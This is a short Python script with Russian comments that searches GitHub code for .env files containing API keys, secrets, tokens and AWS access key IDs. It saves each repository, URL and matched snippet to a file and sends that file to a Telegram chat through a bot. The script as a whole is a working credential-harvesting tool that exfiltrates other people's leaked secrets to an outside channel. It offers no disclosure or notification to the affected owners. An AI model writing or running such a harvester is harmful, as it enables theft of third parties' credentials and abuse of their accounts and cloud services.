import requests
import os
import time
from telebot import TeleBot

# Получаем токен и chat_id из окружения
TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
bot = TeleBot(TOKEN)

# Настройки GitHub поиска
SEARCH_KEYWORDS = ['API_KEY=', 'SECRET=', 'EMAIL=', 'TOKEN=', 'AWS_ACCESS_KEY_ID']
GITHUB_SEARCH_URL = 'https://api.github.com/search/code'
HEADERS = {'Accept': 'application/vnd.github.v3.text-match+json'}
RESULTS_PER_PAGE = 10
OUTPUT_FILE = 'github_env_leaks.txt'

def search_github(keyword, page=1):
    params = {
        'q': f'{keyword} in:file filename:.env',
        'page': page,
        'per_page': RESULTS_PER_PAGE
    }
    response = requests.get(GITHUB_SEARCH_URL, headers=HEADERS, params=params)
    if response.status_code == 200:
        return response.json().get('items', [])
    return []

def extract_info(item):
    repo = item['repository']['full_name']
    url = item['html_url']
    snippet = ''
    for match in item.get('text_matches', []):
        snippet += match.get('fragment', '') + '\n'
    return f"{repo} | {url} | {snippet.strip()}"

def write_results():
    with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
        for keyword in SEARCH_KEYWORDS:
            for page in range(1, 2):  # Страниц можно больше, если будешь с токеном GitHub
                results = search_github(keyword, page)
                for item in results:
                    info = extract_info(item)
                    if info:
                        f.write(info + '\n' + '-' * 80 + '\n')
                time.sleep(2)

def send_to_telegram():
    if os.path.exists(OUTPUT_FILE) and os.path.getsize(OUTPUT_FILE) > 0:
        with open(OUTPUT_FILE, 'rb') as f:
            bot.send_document(chat_id=CHAT_ID, document=f)
    else:
        bot.send_message(chat_id=CHAT_ID, text="Ничего не найдено.")

if __name__ == '__main__':
    write_results()
    send_to_telegram()
